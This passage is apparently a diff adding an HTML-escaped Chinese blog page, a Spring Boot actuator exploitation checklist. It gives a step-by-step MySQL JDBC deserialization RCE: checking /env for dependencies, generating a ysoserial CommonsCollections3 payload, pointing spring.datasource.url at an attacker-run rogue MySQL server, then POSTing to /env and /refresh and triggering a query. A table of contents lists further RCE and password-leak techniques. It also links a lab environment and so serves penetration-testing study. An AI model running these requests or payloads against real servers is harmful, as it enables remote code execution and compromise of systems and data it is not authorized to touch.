+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce&quot;&gt;repository/springboot-h2-database-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9096/h2-console
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x08mysql-jdbc-deserialization-rce&quot;&gt;0x08：mysql jdbc deserialization RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-11&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
+  &lt;li&gt;目标环境中存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql-connector-java&lt;/code&gt; 依赖&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-11&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一查看环境依赖&quot;&gt;步骤一：查看环境依赖&lt;/h5&gt;
+
+&lt;p&gt;GET 请求 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt;，搜索环境变量（classpath）中是否有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql-connector-java&lt;/code&gt;  关键词，并记录下其版本号（5.x 或 8.x）；&lt;/p&gt;
+
+&lt;p&gt;搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;commons-collections&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jdk7u21&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jdk8u20&lt;/code&gt; 等；&lt;/p&gt;
+
+&lt;p&gt;搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.datasource.url&lt;/code&gt; 关键词，记录下其 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value&lt;/code&gt;  值，方便后续恢复其正常 jdbc url 值。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二架设恶意-rogue-mysql-server&quot;&gt;步骤二：架设恶意 rogue mysql server&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的服务器上运行 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py&quot;&gt;springboot-jdbc-deserialization-rce.py&lt;/a&gt; 脚本，并使用 &lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;ysoserial&lt;/a&gt; 自定义要执行的命令：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; ysoserial.jar CommonsCollections3 calc &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload.ser
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在脚本&lt;strong&gt;同目录下&lt;/strong&gt;生成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload.ser&lt;/code&gt; 反序列化 payload 文件，供脚本使用。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤三设置-springdatasourceurl-属性&quot;&gt;步骤三：设置 spring.datasource.url 属性&lt;/h5&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;mysql-connector-java 5.x 版本设置&lt;strong&gt;属性值&lt;/strong&gt;为：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;amp;useSSL=false&amp;amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;autoDeserialize=true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;mysql-connector-java 8.x 版本设置&lt;strong&gt;属性值&lt;/strong&gt;为：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;amp;useSSL=false&amp;amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;autoDeserialize=true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.datasource.url=对应属性值
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤四刷新配置-1&quot;&gt;步骤四：刷新配置&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤五触发数据库查询&quot;&gt;步骤五：触发数据库查询&lt;/h5&gt;
+
+&lt;p&gt;尝试访问网站已知的数据库查询的接口，例如： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/product/list&lt;/code&gt; ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤六恢复正常-jdbc-url&quot;&gt;步骤六：恢复正常 jdbc url&lt;/h5&gt;
+
+&lt;p&gt;反序列化漏洞利用完成后，使用 &lt;strong&gt;步骤三&lt;/strong&gt; 的方法恢复 &lt;strong&gt;步骤一&lt;/strong&gt; 中记录的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.datasource.url&lt;/code&gt; 的原始 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value&lt;/code&gt; 值&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞原理-6&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址&lt;/li&gt;
+  &lt;li&gt;refresh 刷新后设置了一个新的 spring.datasource.url 属性值&lt;/li&gt;
+  &lt;li&gt;当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接&lt;/li&gt;
+  &lt;li&gt;然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据&lt;/li&gt;
+  &lt;li&gt;目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-7&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf&quot;&gt;New-Exploit-Technique-In-Java-Deserialization-Attack&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-7&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce&quot;&gt;repository/springboot-mysql-jdbc-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9097/actuator/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;发送完 payload 后触发漏洞：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9097/product/list
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+
+                &lt;!-- [x] 2022/10/20/10:49:36 fixed: while width &lt; some inch. would be flex column not display like a row.--&gt;
+&lt;footer&gt;
+	&lt;style&gt;.border-top {
+		border-top: 1.5px solid #d0d7de!important;
+	}&lt;/style&gt;
+	&lt;div class=&quot;border-top&quot;&gt;&lt;/div&gt;
+		&lt;section class=&quot;container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto&quot;&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix &quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;申明&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;div class=&quot;mb-2&quot;&gt;&lt;a href=&quot;/blog/2020/spring-boot-vuln-summary/&quot; target=&quot;_blank&quot; class=&quot; text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-link&quot;&gt;&lt;/div&gt;
+						转载请申明本文档链接&lt;/a&gt;&lt;/div&gt;
+					&lt;div&gt;&lt;a href=&quot;https://github.com/LandGrey&quot; target=&quot;_blank&quot;  class=&quot;text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-user&quot;&gt;&lt;/div&gt;
+						Post by LandGrey.&lt;/a&gt;
+					&lt;/div&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;贡献开源文档&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2020-09-25-spring-boot-vuln-summary.markdown&quot; target=&quot;_blank&quot; class=&quot;no-underline btn mr-1 color-border-accent-emphasis&quot;&gt;
+						&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; role=&quot;img&quot; class=&quot;octicon mr-1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot; height=&quot;16&quot; fill=&quot;currentColor&quot; style=&quot;display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;
+						贡献当前开源文档
+					&lt;/a&gt;
+					&lt;p class=&quot;f0_8-l mt-2 text-bold&quot;&gt;此之前，学习开源贡献&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码&quot;&gt;CN&amp;nbsp;|&lt;/a&gt;
+						&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/github/docs/blob/main/CONTRIBUTING.md&quot;&gt;EN&lt;/a&gt;&lt;/p&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;此文档对您有帮助吗&lt;/h2&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/&quot; target=&quot;_blank&quot; class=&quot;no-underline&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;给文档仓库点个赞!&quot;&gt;
+					&lt;div class=&quot;fa fa-thumbs-o-up&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&amp;template=2-bug_report.yaml&amp;title=_posts/blog/2020-09-25-spring-boot-vuln-summary.markdown&amp;nbsp; 不得不谈的：「Spring Boot」未授权渗透 | © 哨兵 | SENTINEL SECURITY, LAB&quot; target=&quot;_blank&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;本文档有问题?&quot;&gt;
+				&lt;div class=&quot;fa fa-thumbs-o-down&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+			&lt;/div&gt;
+		&lt;/section&gt;
+&lt;/footer&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;spacing&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;&lt;!--/col-lg-8 --&gt;
+        
+&lt;div class=&quot;ml-hide article-index thin-scrollbar position-sticky top-0&quot; style=&quot;max-height: 100vh; overflow-y: auto;&quot;&gt;
+    &lt;div class=&quot;nav nav-stacked tableOfContents_35-E&quot;&gt;
+        &lt;li class=&quot; table-of-contents&quot;&gt;
+            &lt;code-index-css&gt;
+                &lt;ul&gt;&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column&quot;&gt;&lt;a&gt;文章目录&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
+                &lt;ul id=&quot;toc&quot; class=&quot;section-nav&quot;&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#声明&quot;&gt;声明&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#spring-boot-vulnerability-exploit-checklist&quot;&gt;Spring Boot Vulnerability Exploit CheckList&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#零路由和版本&quot;&gt;零：路由和版本&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x01路由知识&quot;&gt;0x01：路由知识&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x02版本知识&quot;&gt;0x02：版本知识&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#常见组件的版本相互依赖关系&quot;&gt;常见组件的版本相互依赖关系：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#spring-cloud-与-spring-boot-大版本之间的依赖关系&quot;&gt;Spring Cloud 与 Spring Boot 大版本之间的依赖关系：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#spring-cloud-小版本号的后缀及含义&quot;&gt;Spring Cloud 小版本号的后缀及含义:&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#一信息泄露&quot;&gt;一：信息泄露&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x01路由地址及接口调用详情泄漏&quot;&gt;0x01：路由地址及接口调用详情泄漏&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x02配置不当而暴露的路由&quot;&gt;0x02：配置不当而暴露的路由&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x03获取被星号脱敏的密码的明文-方法一&quot;&gt;0x03：获取被星号脱敏的密码的明文 (方法一)&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x04获取被星号脱敏的密码的明文-方法二&quot;&gt;0x04：获取被星号脱敏的密码的明文 (方法二)&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件-1&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法-1&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x05获取被星号脱敏的密码的明文-方法三&quot;&gt;0x05：获取被星号脱敏的密码的明文 (方法三)&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件-2&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法-2&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x06获取被星号脱敏的密码的明文-方法四&quot;&gt;0x06：获取被星号脱敏的密码的明文 (方法四)&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件-3&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法-3&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#二远程代码执行&quot;&gt;二：远程代码执行&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x01whitelabel-error-page-spel-rce&quot;&gt;0x01：whitelabel error page SpEL RCE&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件-4&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法-4&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞原理&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞分析&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞环境&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x02spring-cloud-snakeyaml-rce&quot;&gt;0x02：spring cloud SnakeYAML RCE&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件-5&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法-5&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞原理-1&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞分析-1&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞环境-1&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x03eureka-xstream-deserialization-rce&quot;&gt;0x03：eureka xstream deserialization RCE&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件-6&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法-6&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞原理-2&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞分析-2&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞环境-2&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x04jolokia-logback-jndi-rce&quot;&gt;0x04：jolokia logback JNDI RCE&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件-7&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法-7&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞原理-3&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞分析-3&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞环境-3&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x05jolokia-realm-jndi-rce&quot;&gt;0x05：jolokia Realm JNDI RCE&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件-8&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法-8&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
